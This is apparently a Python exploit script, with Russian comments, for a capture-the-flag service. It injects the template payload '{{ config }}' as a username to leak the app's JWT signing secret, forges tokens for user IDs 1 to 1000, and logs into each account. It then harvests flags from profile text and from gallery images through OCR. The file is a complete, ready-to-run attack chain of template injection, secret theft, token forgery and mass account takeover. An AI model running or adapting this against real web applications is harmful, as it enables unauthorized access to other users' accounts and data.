#!/usr/bin/env python3
import sys
import requests
import re
import jwt
import io
import tempfile
import os
from urllib.parse import quote
import pytesseract
from PIL import Image

TIMEOUT = 5
SECRET_KEY_PATTERN = re.compile(r"JWT_SECRET_KEY[^\w]*['\"]*([a-f0-9]{64})")
DESCRIPTION_PATTERN = re.compile(r'<div class="description-text">\s*(.*?)\s*</div>', re.DOTALL)
GALLERY_ITEM_PATTERN = re.compile(r'<div class="gallery-item">.*?<img src="([^"]+)".*?</div>', re.DOTALL)
FLAG_PATTERN = re.compile(r'[A-Z0-9]{31}=')
BASE_URL_PATTERN = re.compile(r'(https?://[^/]+)')


def register_or_login(session, base_url, username, password):
    """
    Пытается зарегистрироваться, если 400 ошибка - пробует залогиниться.
    Возвращает (success, response)
    """
    encoded_username = quote(username)
    data = f"username={encoded_username}&password={password}"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    # Сначала пробуем регистрацию
    r = session.post(f"{base_url}/register", data=data, headers=headers, timeout=TIMEOUT)
    
    if r.status_code == 200:
        return True, r
    
    elif r.status_code == 400:
        # Пробуем залогиниться
        r = session.post(f"{base_url}/login", data=data, headers=headers, timeout=TIMEOUT)
        return r.status_code == 200, r
    
    return False, r


def get_jwt_secret(host, port):
    """
    Получает JWT_SECRET_KEY через SSTI уязвимость.
    """
    base_url = f"http://{host}:{port}"
    session = requests.Session()
    
    print("[*] Получение JWT_SECRET_KEY через SSTI...")
    
    # Регистрация/логин с SSTI payload
    success, _ = register_or_login(session, base_url, "{{ config }}", "123")
    
    if not success:
        print("[!] Не удалось получить доступ с SSTI payload")
        return None
    
    # Запрос к главной странице
    r = session.get(f"{base_url}/", timeout=TIMEOUT)
    if r.status_code != 200:
        print(f"[!] Ошибка получения страницы: HTTP {r.status_code}")
        return None
    
    # Поиск JWT_SECRET_KEY
    content = r.text
    
    # Поиск по контексту JWT_SECRET_KEY
    if "JWT_SECRET_KEY" in content:
        pos = content.find("JWT_SECRET_KEY")
        context = content[pos:pos+200]
        hex_match = re.search(r'([a-f0-9]{64})', context)
        if hex_match:
            secret_key = hex_match.group(1)
            print(f"[+] Найден JWT_SECRET_KEY: {secret_key}")
            return secret_key
    
    # Поиск с раскодированными HTML entities
    content = content.replace("&amp;#39;", "'").replace("&amp;quot;", '"')
    secret_match = SECRET_KEY_PATTERN.search(content)
    if secret_match:
        secret_key = secret_match.group(1)
        print(f"[+] Найден JWT_SECRET_KEY: {secret_key}")
        return secret_key
    
    print("[!] JWT_SECRET_KEY не найден")
    return None


def get_original_token(host, port):
    """
    Получает оригинальный JWT токен от любого пользователя.
    """
    base_url = f"http://{host}:{port}"
    session = requests.Session()
    
    # Используем случайное имя, чтобы гарантированно создать нового пользователя
    import random
    test_username = f"user_{random.randint(10000, 99999)}"
    
    success, _ = register_or_login(session, base_url, test_username, "123")
    
    if not success:
        print("[!] Не удалось получить тестового пользователя")
        return None, None
    
    access_token = session.cookies.get("access_token")
    if not access_token:
        print("[!] access_token не найден в cookies")
        return None, None
    
    return access_token, session


def create_forged_tokens(original_token, secret_key, start_id=1, end_id=1000):
    """
    Создает поддельные JWT токены с разными sub значениями.
    """
    try:
        # Получаем заголовок и payload из оригинального токена
        header = jwt.get_unverified_header(original_token)
        payload = jwt.decode(original_token, options={"verify_signature": False})
        
        print(f"[*] Оригинальный payload: {payload}")
        print(f"[*] Алгоритм: {header['alg']}")
        
        forged_tokens = {}
        
        for user_id in range(start_id, end_id + 1):
            new_payload = payload.copy()
            new_payload["sub"] = str(user_id)
            
            forged_token = jwt.encode(new_payload, secret_key, algorithm=header['alg'])
            forged_tokens[user_id] = forged_token
        
        print(f"[+] Создано {len(forged_tokens)} поддельных токенов")
        return forged_tokens
        
    except Exception as e:
        print(f"[!] Ошибка при создании токенов: {e}")
        return None


def extract_text_from_image(image_data):
    """
    Извлекает текст из изображения с помощью Tesseract OCR.
    """
    try:
        # Открываем изображение из байтов
        image = Image.open(io.BytesIO(image_data))
        
        # Конфигурация Tesseract для лучшего распознавания текста
        # --psm 6: рассматривать изображение как единый блок текста
        # -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789=: ограничиваем набор символов
        custom_config = r'--psm 6 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789='
        
        # Извлекаем текст
        text = pytesseract.image_to_string(image, config=custom_config)
        
        # Очищаем от пробелов и лишних символов
        text = ''.join(text.split()).upper()
        
        return text
    except Exception as e:
        print(f"[!] Ошибка OCR: {e}")
        return ""


def download_and_check_image(session, image_url):
    """
    Скачивает изображение и ищет в нем флаги.
    """
    try:
        r = session.get(image_url, timeout=TIMEOUT)
        if r.status_code == 200 and r.headers.get('content-type', '').startswith('image/'):
            # Извлекаем текст из изображения
            text = extract_text_from_image(r.content)
            
            # Ищем флаги в распознанном тексте
            flags = FLAG_PATTERN.findall(text)
            return flags
    except Exception as e:
        print(f"[!] Ошибка при скачивании изображения: {e}")
    
    return []


def extract_flags_from_user(session, user_id, base_url, html_content):
    """
    Извлекает флаги из описания и изображений пользователя.
    """
    flags_found = []
    
    # 1. Проверяем описание
    desc_match = DESCRIPTION_PATTERN.search(html_content)
    if desc_match:
        description = desc_match.group(1).strip()
        description = re.sub(r'<[^>]+>', '', description)
        description = description.replace("&nbsp;", " ").strip()
        
        flags = FLAG_PATTERN.findall(description)
        for flag in flags:
            if flag not in flags_found:
                flags_found.append(flag)
                print(f"[+] Пользователь {user_id} (описание): {flag}")
    
    # 2. Проверяем галерею
    gallery_items = GALLERY_ITEM_PATTERN.findall(html_content)
    
    for img_src in gallery_items:
        # Формируем полный URL изображения
        if img_src.startswith('http'):
            img_url = img_src
        else:
            img_url = base_url + img_src
        
        print(f"[*] Пользователь {user_id}: проверяю изображение {img_src}")
        
        flags = download_and_check_image(session, img_url)
        for flag in flags:
            if flag not in flags_found:
                flags_found.append(flag)
                print(f"[+] Пользователь {user_id} (изображение {img_src}): {flag}")
    
    return flags_found


def extract_flags(host, port, forged_tokens):
    """
    Перебирает пользователей и извлекает флаги из описаний и изображений.
    """
    base_url = f"http://{host}:{port}"
    all_flags = []
    
    print(f"[*] Поиск флагов у пользователей 1-{len(forged_tokens)}...")
    print("[*] OCR инициализирован, начинаю анализ...")
    
    for user_id, token in forged_tokens.items():
        session = requests.Session()
        session.cookies.set("access_token", token)
        
        try:
            r = session.get(f"{base_url}/", timeout=TIMEOUT)
            
            if r.status_code == 200:
                user_flags = extract_flags_from_user(session, user_id, base_url, r.text)
                all_flags.extend(user_flags)
            
        except requests.RequestException as e:
            print(f"[!] Ошибка при запросе пользователя {user_id}: {e}")
        
        # Прогресс каждые 50 запросов
        if user_id % 50 == 0:
            print(f"[*] Проверено: {user_id}/{len(forged_tokens)} | Найдено флагов: {len(set(all_flags))}")
    
    return list(set(all_flags))


def check_tesseract():
    """
    Проверяет доступность Tesseract OCR.
    """
    try:
        pytesseract.get_tesseract_version()
        return True
    except Exception:
        return False


def main():
    if len(sys.argv) < 3:
        print("Usage: sploit.py HOST PORT [START_ID] [END_ID]")
        print("Example: sploit.py 127.0.0.1 1337 1 1000")
        print("\nТребования:")
        print("  - Установленный Tesseract OCR (https://github.com/tesseract-ocr/tesseract)")
        print("  - pip install pytesseract pillow")
        sys.exit(1)
    
    # Проверяем наличие Tesseract
    if not check_tesseract():
        print("[!] Tesseract OCR не найден!")
        print("[!] Установите Tesseract:")
        print("    Ubuntu/Debian: sudo apt-get install tesseract-ocr")
        print("    macOS: brew install tesseract")
        print("    Windows: скачайте с https://github.com/UB-Mannheim/tesseract/wiki")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    start_id = 1
    end_id = 1000
    
    if len(sys.argv) >= 4:
        start_id = int(sys.argv[3])
    if len(sys.argv) >= 5:
        end_id = int(sys.argv[4])
    
    # Шаг 1: Получаем JWT секретный ключ
    secret_key = get_jwt_secret(host, port)
    if not secret_key:
        print("[!] Не удалось получить JWT_SECRET_KEY")
        sys.exit(1)
    
    # Шаг 2: Получаем оригинальный токен для структуры
    original_token, _ = get_original_token(host, port)
    if not original_token:
        print("[!] Не удалось получить оригинальный токен")
        sys.exit(1)
    
    # Шаг 3: Создаем поддельные токены
    forged_tokens = create_forged_tokens(original_token, secret_key, start_id, end_id)
    if not forged_tokens:
        print("[!] Не удалось создать поддельные токены")
        sys.exit(1)
    
    # Шаг 4: Ищем флаги в описаниях и изображениях
    flags = extract_flags(host, port, forged_tokens)
    
    # Шаг 5: Выводим результаты
    print("\n" + "="*50)
    print("НАЙДЕННЫЕ ФЛАГИ:")
    print("="*50)
    
    if flags:
        for flag in sorted(flags):
            print(flag)
        print(f"\n[*] Всего найдено флагов: {len(flags)}")
    else:
        print("[!] Флаги не найдены")
    
    print(f"\n[*] Готово! Проверено пользователей: {end_id - start_id + 1}")


if __name__ == "__main__":
    main()